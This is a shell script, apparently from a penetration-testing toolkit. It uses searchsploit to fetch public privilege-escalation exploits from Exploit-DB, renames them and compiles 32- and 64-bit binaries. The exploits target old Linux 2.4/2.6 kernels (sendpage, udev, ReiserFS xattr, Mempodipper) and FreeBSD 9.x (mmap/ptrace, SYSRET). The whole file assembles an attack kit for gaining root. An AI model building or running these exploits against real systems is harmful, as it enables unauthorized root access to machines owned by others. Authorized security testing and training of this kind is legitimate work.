mkdir -p exploits_linux_prevesc/2.4.x
cd exploits_linux_prevesc/2.4.x
    
    if [ ! -f linux-sendpage-86 ]; then
        searchsploit -m https://www.exploit-db.com/exploits/9545
        mv 9545.c linux-sendpage.c
        gcc -Wall -m32 -Wl,--hash-style=both -o linux-sendpage-86 linux-sendpage.c
        gcc -Wall -m64 -Wl,--hash-style=both -o linux-sendpage-64 linux-sendpage.c
    fi 

cd -

mkdir -p exploits_linux_prevesc/2.6.x
cd exploits_linux_prevesc/2.6.x
    
    if [ ! -f linux-sendpage-86 ]; then
        searchsploit -m https://www.exploit-db.com/exploits/9545
        mv 9545.c linux-sendpage.c
        gcc -Wall -m32 -Wl,--hash-style=both -o linux-sendpage-86 linux-sendpage.c
        gcc -Wall -m64 -Wl,--hash-style=both -o linux-sendpage-64 linux-sendpage.c
    fi

    if [ ! -f udev.sh ]; then
        searchsploit -m 8478
        mv 8478.sh udev.sh
    fi

    if [ ! -f ReiserFS-xattr.py ]; then
        searchsploit -m 12130
        mv 12130.py ReiserFS-xattr.py
    fi

cd -

mkdir -p exploits_linux_prevesc/bsd
cd exploits_linux_prevesc/bsd

    if [ ! -f freebsd-9.0-9.1-mmap_ptrace-86 ]; then
        searchsploit -m https://www.exploit-db.com/exploits/26368 
        mv 26368.c freebsd-9.0-9.1-mmap_ptrace.c
        gcc -Wall -m32 -Wl,--hash-style=both -o freebsd-9.0-9.1-mmap_ptrace-86 freebsd-9.0-9.1-mmap_ptrace.c
        gcc -Wall -m64 -Wl,--hash-style=both -o freebsd-9.0-9.1-mmap_ptrace-64 freebsd-9.0-9.1-mmap_ptrace.c
    fi

    if [ ! -f freebsd-9.0-SYSRET-86 ]; then
        searchsploit -m https://www.exploit-db.com/exploits/28718
        mv 28718.c freebsd-9.0-SYSRET.c
        gcc -Wall -m32 -Wl,--hash-style=both -o freebsd-9.0-SYSRET-86 freebsd-9.0-SYSRET.c
        gcc -Wall -m64 -Wl,--hash-style=both -o freebsd-9.0-SYSRET-64 freebsd-9.0-SYSRET.c
    fi

cd -

cd exploits_linux_prevesc
    
    if [ ! -f 2.6.39-3.2.2-Mempodipper_1-86 ]; then
        searchsploit -m https://www.exploit-db.com/exploits/35161
        mv 35161.c 2.6.39-3.2.2-Mempodipper_1.c
        gcc -Wall -m32 -Wl,--hash-style=both -o 2.6.39-3.2.2-Mempodipper_1-86 2.6.39-3.2.2-Mempodipper_1.c 
        gcc -Wall -m64 -Wl,--hash-style=both -o 2.6.39-3.2.2-Mempodipper_1-64 2.6.39-3.2.2-Mempodipper_1.c 
    fi

    if [ ! -f 2.6.39-3.2.2-Mempodipper_2-86 ]; then
        searchsploit -m https://www.exploit-db.com/exploits/18411
        mv 18411.c 2.6.39-3.2.2-Mempodipper_2.c
        gcc -Wall -m32 -Wl,--hash-style=both -o 2.6.39-3.2.2-Mempodipper_2-86 2.6.39-3.2.2-Mempodipper_2.c 
        gcc -Wall -m64 -Wl,--hash-style=both -o 2.6.39-3.2.2-Mempodipper_2-64 2.6.39-3.2.2-Mempodipper_2.c
    fi 

cd -

